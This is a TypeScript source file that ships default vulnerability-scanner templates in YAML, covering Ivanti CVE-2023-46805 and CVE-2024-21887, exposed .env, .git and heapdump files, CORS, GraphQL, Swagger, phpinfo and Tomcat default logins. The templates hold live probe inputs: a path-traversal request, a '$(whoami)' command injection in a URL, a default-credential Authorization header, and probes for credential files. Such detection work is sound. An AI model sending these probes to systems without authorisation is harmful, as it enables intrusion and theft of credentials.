import type { TemplateItem } from '../types';

export const DEFAULT_TEMPLATES: TemplateItem[] = [
  {
    id: 'cve-2023-46805-ivanti-auth-bypass',
    name: 'Ivanti Connect Secure - Authentication Bypass',
    severity: 'critical',
    protocol: 'http',
    tags: ['cve', 'cve2023', 'ivanti', 'auth-bypass', 'rce', 'kev'],
    cve_id: 'CVE-2023-46805',
    category: 'cves',
    author: 'projectdiscovery',
    description: 'An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x allows remote attackers to access restricted resources without authentication.',
    yaml_content: `id: cve-2023-46805-ivanti-auth-bypass

info:
  name: Ivanti Connect Secure - Authentication Bypass
  author: projectdiscovery
  severity: critical
  description: Detects Ivanti Connect Secure / Policy Secure authentication bypass vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-46805
  tags: cve,cve2023,ivanti,auth-bypass,kev

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/totp/user-backup-code/../../system/system-information"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"build"'
          - '"version"'
        condition: and
    extractors:
      - type: regex
        name: ivanti_version
        part: body
        regex:
          - '"version":\\s*"([^"]+)"'
        group: 1`,
  },
  {
    id: 'cve-2024-21887-ivanti-command-injection',
    name: 'Ivanti Connect Secure - Command Injection',
    severity: 'critical',
    protocol: 'http',
    tags: ['cve', 'cve2024', 'ivanti', 'rce', 'kev'],
    cve_id: 'CVE-2024-21887',
    category: 'cves',
    author: 'researcher',
    description: 'A command injection vulnerability in web components of Ivanti Connect Secure allows an authenticated administrator to send specially crafted requests and execute arbitrary commands.',
    yaml_content: `id: cve-2024-21887-ivanti-command-injection

info:
  name: Ivanti Connect Secure - Command Injection
  author: researcher
  severity: critical
  description: Detects command injection endpoint in Ivanti Connect Secure.
  tags: cve,cve2024,ivanti,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/license/keys-status/$(whoami)"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root"
          - "bin/bash"
        condition: or`,
  },
  {
    id: 'env-file-disclosure',
    name: 'Environment (.env) File Disclosure',
    severity: 'high',
    protocol: 'http',
    tags: ['exposure', 'config', 'sensitive', 'database', 'tokens'],
    category: 'exposures',
    author: 'geeknik',
    description: 'Detects publicly accessible .env configuration files containing database credentials, API secret keys, and application tokens.',
    yaml_content: `id: env-file-disclosure

info:
  name: Environment (.env) File Disclosure
  author: geeknik
  severity: high
  description: Publicly accessible .env configuration file found exposing critical secrets.
  tags: exposure,config,sensitive

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.local"
      - "{{BaseURL}}/.env.production"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "DB_PASSWORD="
          - "APP_KEY="
          - "AWS_SECRET_ACCESS_KEY="
          - "DATABASE_URL="
        condition: or
    extractors:
      - type: regex
        name: db_host
        part: body
        regex:
          - 'DB_HOST=([^\r\n]+)'
        group: 1`,
  },
  {
    id: 'git-config-disclosure',
    name: 'Exposed .git/config Repository Metadata',
    severity: 'medium',
    protocol: 'http',
    tags: ['exposure', 'git', 'vcs', 'source-code'],
    category: 'exposures',
    author: 'ethicalhack3r',
    description: 'An exposed Git directory allows unauthorized users to download application source code and revision history.',
    yaml_content: `id: git-config-disclosure

info:
  name: Exposed .git/config Repository Metadata
  author: ethicalhack3r
  severity: medium
  description: Verifies presence of Git repository metadata directory.
  tags: exposure,git,vcs

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/.git/HEAD"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "[core]"
          - "repositoryformatversion"
          - "ref: refs/heads/"
        condition: or`,
  },
  {
    id: 'spring-boot-actuator-heapdump',
    name: 'Spring Boot Actuator - Heapdump Exposure',
    severity: 'high',
    protocol: 'http',
    tags: ['exposure', 'springboot', 'actuator', 'java', 'memory-dump'],
    category: 'exposures',
    author: 'dhiyaneshdk',
    description: 'Spring Boot Actuator heapdump endpoint allows attackers to download complete JVM memory dumps containing memory tokens, passwords, and sessions.',
    yaml_content: `id: spring-boot-actuator-heapdump

info:
  name: Spring Boot Actuator - Heapdump Exposure
  author: dhiyaneshdk
  severity: high
  description: Detects exposed Spring Boot actuator heapdump endpoint.
  tags: exposure,springboot,actuator

http:
  - method: GET
    path:
      - "{{BaseURL}}/actuator/heapdump"
      - "{{BaseURL}}/heapdump"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/octet-stream"
          - "application/x-gzip"
        condition: or
      - type: binary
        part: body
        binary:
          - "4a4156412050524f46494c45" # JAVA PROFILE in hex`,
  },
  {
    id: 'cors-wildcard-origin-misconfig',
    name: 'CORS Arbitrary Origin Misconfiguration',
    severity: 'low',
    protocol: 'http',
    tags: ['misconfiguration', 'cors', 'generic'],
    category: 'misconfigurations',
    author: 'vuln-research',
    description: 'CORS Access-Control-Allow-Origin header reflects untrusted client origins allowing cross-domain data exfiltration.',
    yaml_content: `id: cors-wildcard-origin-misconfig

info:
  name: CORS Arbitrary Origin Misconfiguration
  author: vuln-research
  severity: low
  description: Verifies if application reflects arbitrary Origin header in CORS response.
  tags: misconfiguration,cors

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      Origin: "https://evil-attacker.com"
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: https://evil-attacker.com"
          - "Access-Control-Allow-Credentials: true"
        condition: and`,
  },
  {
    id: 'graphql-introspection-enabled',
    name: 'GraphQL Introspection Query Enabled',
    severity: 'info',
    protocol: 'http',
    tags: ['exposure', 'graphql', 'api', 'schema'],
    category: 'exposures',
    author: 'dhiyaneshdk',
    description: 'GraphQL introspection is enabled, allowing attackers to query the complete backend API schema, queries, mutations, and types.',
    yaml_content: `id: graphql-introspection-enabled

info:
  name: GraphQL Introspection Query Enabled
  author: dhiyaneshdk
  severity: info
  description: Detects GraphQL endpoint with introspection enabled.
  tags: exposure,graphql,api

http:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
    headers:
      Content-Type: "application/json"
    body: '{"query":"query { __schema { types { name } } }"}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "__schema"
          - "types"
        condition: and`,
  },
  {
    id: 'tomcat-manager-default-login',
    name: 'Apache Tomcat Manager - Default Login',
    severity: 'high',
    protocol: 'http',
    tags: ['default-login', 'tomcat', 'auth', 'java'],
    category: 'default-logins',
    author: 'c-frame',
    description: 'Detects Apache Tomcat Manager application configured with standard default credentials (tomcat:tomcat, admin:admin).',
    yaml_content: `id: tomcat-manager-default-login

info:
  name: Apache Tomcat Manager - Default Login
  author: c-frame
  severity: high
  description: Detects weak default credentials on Apache Tomcat administrative interface.
  tags: default-login,tomcat,auth

http:
  - method: GET
    path:
      - "{{BaseURL}}/manager/html"
    headers:
      Authorization: "Basic dG9tY2F0OnRvbWNhdA==" # tomcat:tomcat
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Tomcat Web Application Manager"
          - "Server Status"
        condition: and`,
  },
  {
    id: 'swagger-ui-api-disclosure',
    name: 'Swagger / OpenAPI Documentation Disclosure',
    severity: 'info',
    protocol: 'http',
    tags: ['exposure', 'swagger', 'openapi', 'docs', 'api'],
    category: 'exposures',
    author: 'princechaddha',
    description: 'Publicly accessible Swagger UI / OpenAPI documentation exposes internal endpoints, parameter specifications, and data contracts.',
    yaml_content: `id: swagger-ui-api-disclosure

info:
  name: Swagger / OpenAPI Documentation Disclosure
  author: princechaddha
  severity: info
  description: Discloses Swagger interactive API documentation interface.
  tags: exposure,swagger,openapi,api

http:
  - method: GET
    path:
      - "{{BaseURL}}/swagger-ui.html"
      - "{{BaseURL}}/swagger/index.html"
      - "{{BaseURL}}/api-docs"
      - "{{BaseURL}}/v2/api-docs"
      - "{{BaseURL}}/openapi.json"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "swagger-ui"
          - '"swagger":'
          - '"openapi":'
        condition: or`,
  },
  {
    id: 'phpinfo-file-disclosure',
    name: 'PHPInfo Information Disclosure',
    severity: 'low',
    protocol: 'http',
    tags: ['exposure', 'php', 'phpinfo', 'config'],
    category: 'exposures',
    author: 'geeknik',
    description: 'Detects publicly accessible phpinfo() page disclosing PHP configuration, extensions, system paths, and environment variables.',
    yaml_content: `id: phpinfo-file-disclosure

info:
  name: PHPInfo Information Disclosure
  author: geeknik
  severity: low
  description: Detects PHP configuration dump via phpinfo().
  tags: exposure,php,phpinfo

http:
  - method: GET
    path:
      - "{{BaseURL}}/phpinfo.php"
      - "{{BaseURL}}/info.php"
      - "{{BaseURL}}/test.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "PHP Version"
          - "System"
          - "Configuration File (php.ini) Path"
        condition: and`,
  },
];
